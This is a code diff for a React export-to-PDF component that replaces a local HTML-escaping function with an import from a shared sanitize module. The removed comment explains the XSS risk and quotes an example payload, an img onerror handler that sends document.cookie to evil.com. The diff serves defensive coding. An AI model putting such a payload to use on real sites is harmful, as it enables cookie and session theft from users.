@@ -1,37 +1,6 @@
 import { Download } from 'lucide-react';
+import { escapeHtml } from '../../utils/sanitize';
 import './StudentTools.css';
-
-/**
- * Escapes HTML special characters to prevent XSS when interpolating
- * user-controlled strings into a raw HTML template string.
- *
- * All five dangerous HTML characters are covered:
- *   &  →  &amp;   (must be first to avoid double-escaping)
- *   <  →  &lt;
- *   >  →  &gt;
- *   "  →  &quot;
- *   '  →  &#x27;
- *
- * This is applied to every value read from localStorage before it is
- * embedded into the print window's document — specifically:
- *   - h.text        (highlight text, user-selected page content)
- *   - h.color       (CSS color value — attacker could inject "; expression(…)  " in IE)
- *   - h.colorName   (label string)
- *   - n.content     (sticky note body, fully user-controlled)
- *
- * Without escaping, a highlight of:
- *   <img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
- * would execute as script in the print window's same origin.
- */
-function escapeHtml(str) {
-    if (typeof str !== 'string') return '';
-    return str
-        .replace(/&/g, '&amp;')
-        .replace(/</g, '&lt;')
-        .replace(/>/g, '&gt;')
-        .replace(/"/g, '&quot;')
-        .replace(/'/g, '&#x27;');
-}
 
 export default function ExportPDF({ chapterId = 'default', chapterTitle = 'Chapter' }) {
     const handleExport = () => {
